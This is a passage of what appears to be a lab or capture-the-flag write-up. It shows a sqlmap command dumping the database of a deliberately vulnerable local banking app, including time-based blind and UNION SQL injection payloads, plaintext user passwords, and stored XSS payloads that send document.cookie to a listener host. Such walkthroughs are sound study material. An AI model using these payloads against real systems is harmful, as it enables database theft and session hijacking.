step 1:



Step 2- Dump the databse obtained from the previous step

```bash
└─$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' -D vbank --dump            
        ___
       __H__                                                                                                                        
 ___ ___["]_____ ___ ___  {1.5.2#stable}                                                                                            
|_ -| . [.]     | .'| . |                                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                                           
      |_|V...       |_|   http://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:29:59 /2021-05-24/

[06:30:00] [INFO] resuming back-end DBMS 'mysql' 
[06:30:00] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.37.128/index.php'. Do you want to follow? [Y/n] y
you have not declared cookie(s), while server wants to set its own ('USECURITYID=ejvdcqd1ljl...5evf7j65e5'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=alex' AND (SELECT 3713 FROM (SELECT(SLEEP(5)))DePN) AND 'wVsF'='wVsF

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: username=-3760' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170707a71,0x556c6c594452414f576a744a73504d734d74537a474957704c684b6a6d676f79496e694477664d67,0x7170766b71)-- -
---
[06:37:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[06:37:59] [INFO] fetching tables for database: 'vbank'
[06:37:59] [INFO] fetching columns for table 'currencies' in database 'vbank'
[06:37:59] [INFO] fetching entries for table 'currencies' in database 'vbank'
Database: vbank
Table: currencies
[2 entries]
+----+------+
| id | name |
+----+------+
| 1  | $    |
| 2  | €    |
+----+------+

[06:37:59] [INFO] table 'vbank.currencies' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/currencies.csv'                                                                                                                          
[06:37:59] [INFO] fetching columns for table 'transfers' in database 'vbank'
[06:37:59] [INFO] fetching entries for table 'transfers' in database 'vbank'
Database: vbank
Table: transfers
[7 entries]
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+
| id | time                | amount | dstacc   | remark                                                                                      | srcacc   | dstbank  | srcbank  |
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+
| 4  | 2014-03-29 04:14:07 | 70     | 22222222 | Refund                                                                                      | 11111111 | 41131337 | 41131337 |
| 5  | 2014-03-29 04:24:33 | 300    | 11111111 | WG rent                                                                                     | 22222222 | 41131337 | 41131337 |
| 7  | 2014-03-30 03:46:13 | 110    | 11111111 | Insurance                                                                                   | 22222222 | 41131337 | 41131337 |
| 91 | 2021-05-19 10:04:08 | 6      | 3        | test                                                                                        | 11111111 | 41131337 | 41131337 |
| 92 | 2021-05-19 10:04:35 | 6      | 33333333 | 5                                                                                           | 11111111 | 41131337 | 41131337 |
| 93 | 2021-05-23 15:33:36 | 1      | 33333333 | <script>new Image().src="http://192.168.37.128:81/cookie.html?c="+document.cookie;</script> | 11111111 | 20888888 | 41131337 |
| 94 | 2021-05-23 15:37:36 | 6      | 22222222 | <script>new Image().src="http://192.168.37.128:81/c="+document.cookie;</script>             | 11111111 | 41131337 | 41131337 |
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+

[06:37:59] [INFO] table 'vbank.transfers' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/transfers.csv'                                                                                                                            
[06:37:59] [INFO] fetching columns for table 'branches' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'branches' in database 'vbank'
Database: vbank
Table: branches
[4 entries]
+----+----------+
| id | name     |
+----+----------+
| 1  | Berlin   |
| 2  | Passau   |
| 3  | Stutgart |
| 4  | Bonn     |
+----+----------+

[06:38:00] [INFO] table 'vbank.branches' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/branches.csv'                                                                                                                              
[06:38:00] [INFO] fetching columns for table 'banks' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'banks' in database 'vbank'
Database: vbank
Table: banks
[4 entries]
+----+----------+--------+
| id | code     | name   |
+----+----------+--------+
| 1  | 20999999 | P-Bank |
| 2  | 20888888 | C-Bank |
| 3  | 20555555 | S-Bank |
| 4  | 41131337 | V-Bank |
+----+----------+--------+

[06:38:00] [INFO] table 'vbank.banks' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/banks.csv'
[06:38:00] [INFO] fetching columns for table 'accounts' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'accounts' in database 'vbank'
Database: vbank
Table: accounts
[3 entries]
+------+-------+--------+---------+----------+---------+---------------------+----------+
| type | owner | branch | curbal  | account  | deposit | modtime             | currency |
+------+-------+--------+---------+----------+---------+---------------------+----------+
| 2    | 1     | 2      | 10158.3 | 11111111 | 0       | 2021-05-23 15:37:36 | 1        |
| 2    | 2     | 3      | 213.2   | 22222222 | 0       | 2021-05-23 15:37:36 | 1        |
| 2    | 1     | 4      | 1136.5  | 33333333 | 0       | 2021-05-23 15:33:36 | 2        |
+------+-------+--------+---------+----------+---------+---------------------+----------+

[06:38:00] [INFO] table 'vbank.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/accounts.csv'                                                                                                                              
[06:38:00] [INFO] fetching columns for table 'typesAcc' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'typesAcc' in database 'vbank'
Database: vbank
Table: typesAcc
[2 entries]
+----+--------+
| id | name   |
+----+--------+
| 1  | Local  |
| 2  | Global |
+----+--------+

[06:38:00] [INFO] table 'vbank.typesAcc' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/typesAcc.csv'                                                                                                                              
[06:38:00] [INFO] fetching columns for table 'loans' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'loans' in database 'vbank'
Database: vbank
Table: loans
[6 entries]
+----+-------+---------------------+--------+----------+----------+----------+-----------+
| id | owner | time                | amount | period   | debitacc | interest | creditacc |
+----+-------+---------------------+--------+----------+----------+----------+-----------+
| 10 | 1     | 2014-03-27 04:37:05 | 1000   | 1        | 33333333 | 4.2      | 11111111  |
| 12 | 1     | 2021-04-18 11:19:41 | 9      | 1        | 33333333 | 4.2      | 11111111  |
| 13 | 1     | 2021-04-18 11:20:56 | 10     | 1        | 33333333 | 4.2      | 11111111  |
| 14 | 1     | 2021-04-25 09:59:22 | 1      | 1        | 33333333 | 4.2      | 11111111  |
| 15 | 1     | 2021-05-01 05:01:13 | 10000  | 1        | 33333333 | -4.2     | 11111111  |
| 16 | 1     | 2021-05-10 09:37:41 | 3      | 1        | 33333333 | 4.2      | 11111111  |
+----+-------+---------------------+--------+----------+----------+----------+-----------+

[06:38:00] [INFO] table 'vbank.loans' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/loans.csv'
[06:38:00] [INFO] fetching columns for table 'users' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'users' in database 'vbank'
Database: vbank
Table: users
[5 entries]
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+
| id                  | name        | time                | lastip              | lasttime            | password | username | firstname |
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+
| 1                   | Lexo        | 2014-03-02 00:00:00 | 192.168.37.128      | 2021-05-24 05:28:33 | test1234 | alex     | Alex      |
| 2                   | Obby        | 2014-03-02 00:00:00 | 192.168.37.128      | 2021-05-23 15:38:18 | b0BP4S5  | bob      | Bob       |
| 2021-04-21 11:45:18 | <blank>     | 3                   | smurf               | smurf               | <blank>  | <blank>  | 127.0.0.1 |
| 2021-04-21 13:09:28 | <blank>     | 77                  | metest              | metest              | <blank>  | <blank>  | 127.0.0.1 |
| 127.0.0.1           | password123 | chaplin             | 2021-05-01 18:32:08 | charlie             | charlie  | <blank>  | 99999     |
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+

[06:38:00] [INFO] table 'vbank.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/users.csv'
[06:38:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.37.128'

[*] ending @ 06:38:00 /2021-05-24/

```